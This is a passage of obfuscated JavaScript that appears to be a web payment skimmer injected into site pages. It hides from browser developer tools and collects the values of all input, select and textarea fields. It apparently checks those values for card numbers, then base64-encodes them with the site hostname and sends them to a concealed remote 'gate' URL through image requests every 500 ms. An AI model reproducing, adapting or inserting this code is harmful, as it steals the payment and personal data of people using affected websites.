_0x457d1a=_0x411472?_0x3f9e('0xa'):_0x3f9e('0xb');if(!(_0xc510dc&&_0x411472)&&(window[_0x3f9e('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x3f9e('0xd')]&&window[_0x3f9e('0xc')]['\x63\x68\x72\x6f\x6d\x65']['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x411472||_0xc510dc)){if(!_0x2bf4f8['\x69\x73\x4f\x70\x65\x6e']||_0x2bf4f8[_0x3f9e('0xe')]!==_0x457d1a){_0x46819e(!![],_0x457d1a);}_0x2bf4f8[_0x3f9e('0x4')]=!![];_0x2bf4f8['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=_0x457d1a;}else{if(_0x2bf4f8[_0x3f9e('0x4')]){_0x46819e(![],undefined);}_0x2bf4f8[_0x3f9e('0x4')]=![];_0x2bf4f8[_0x3f9e('0xe')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module[_0x3f9e('0xf')]){module[_0x3f9e('0xf')]=_0x2bf4f8;}else{window[_0x3f9e('0x10')]=_0x2bf4f8;}}());String[_0x3f9e('0x11')][_0x3f9e('0x12')]=function(){var _0x444bce=0x0,_0x14c036,_0xce9fd1;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x444bce;for(_0x14c036=0x0;_0x14c036<this[_0x3f9e('0x2')];_0x14c036++){_0xce9fd1=this[_0x3f9e('0x13')](_0x14c036);_0x444bce=(_0x444bce<<0x5)-_0x444bce+_0xce9fd1;_0x444bce|=0x0;}return _0x444bce;};var _0x4b22f9={};_0x4b22f9[_0x3f9e('0x14')]=_0x3f9e('0x15');_0x4b22f9[_0x3f9e('0x16')]={};_0x4b22f9['\x53\x65\x6e\x74']=[];_0x4b22f9[_0x3f9e('0x17')]=![];_0x4b22f9[_0x3f9e('0x18')]=function(_0x325bde){if(_0x325bde.id!==undefined&&_0x325bde.id!=''&&_0x325bde.id!==null&&_0x325bde.value.length<0x100&&_0x325bde.value.length>0x0){if(_0x8fd587(_0x3c7f51(_0x3c7f51(_0x325bde.value,'\x2d',''),'\x20',''))&&_0x1ebd81(_0x3c7f51(_0x3c7f51(_0x325bde.value,'\x2d',''),'\x20','')))_0x4b22f9.IsValid=!![];_0x4b22f9.Data[_0x325bde.id]=_0x325bde.value;return;}if(_0x325bde.name!==undefined&&_0x325bde.name!=''&&_0x325bde.name!==null&&_0x325bde.value.length<0x100&&_0x325bde.value.length>0x0){if(_0x8fd587(_0x3c7f51(_0x3c7f51(_0x325bde.value,'\x2d',''),'\x20',''))&&_0x1ebd81(_0x3c7f51(_0x3c7f51(_0x325bde.value,'\x2d',''),'\x20','')))_0x4b22f9.IsValid=!![];_0x4b22f9.Data[_0x325bde.name]=_0x325bde.value;return;}};_0x4b22f9[_0x3f9e('0x19')]=function(){var _0x1c8b72=document.getElementsByTagName(_0x3f9e('0x1a'));var _0x8eb4ac=document.getElementsByTagName(_0x3f9e('0x1b'));var _0x22eb63=document.getElementsByTagName(_0x3f9e('0x1c'));for(var _0x59cdd4=0x0;_0x59cdd4<_0x1c8b72.length;_0x59cdd4++)_0x4b22f9.SaveParam(_0x1c8b72[_0x59cdd4]);for(var _0x59cdd4=0x0;_0x59cdd4<_0x8eb4ac.length;_0x59cdd4++)_0x4b22f9.SaveParam(_0x8eb4ac[_0x59cdd4]);for(var _0x59cdd4=0x0;_0x59cdd4<_0x22eb63.length;_0x59cdd4++)_0x4b22f9.SaveParam(_0x22eb63[_0x59cdd4]);};_0x4b22f9['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x4b22f9.IsValid){_0x4b22f9.Data[_0x3f9e('0x1d')]=location.hostname;var _0xb79c62=encodeURIComponent(window.btoa(JSON.stringify(_0x4b22f9.Data)));var _0x7c3948=_0xb79c62.hashCode();for(var _0x43fab2=0x0;_0x43fab2<_0x4b22f9.Sent.length;_0x43fab2++)if(_0x4b22f9.Sent[_0x43fab2]==_0x7c3948)return;_0x4b22f9.LoadImage(_0xb79c62);}};_0x4b22f9['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x4b22f9.SaveAllFields();_0x4b22f9.SendData();};_0x4b22f9[_0x3f9e('0x1e')]=function(_0x56d9e6){_0x4b22f9.Sent.push(_0x56d9e6.hashCode());var _0x1acff2=document.createElement('\x49\x4d\x47');_0x1acff2.src=_0x4b22f9.GetImageUrl(_0x56d9e6);};_0x4b22f9[_0x3f9e('0x1f')]=function(_0x246433){return _0x4b22f9.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0x246433;};document[_0x3f9e('0x20')]=function(){if(document[_0x3f9e('0x21')]===_0x3f9e('0x22')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0x4b22f9[_0x3f9e('0x23')],0x1f4);}};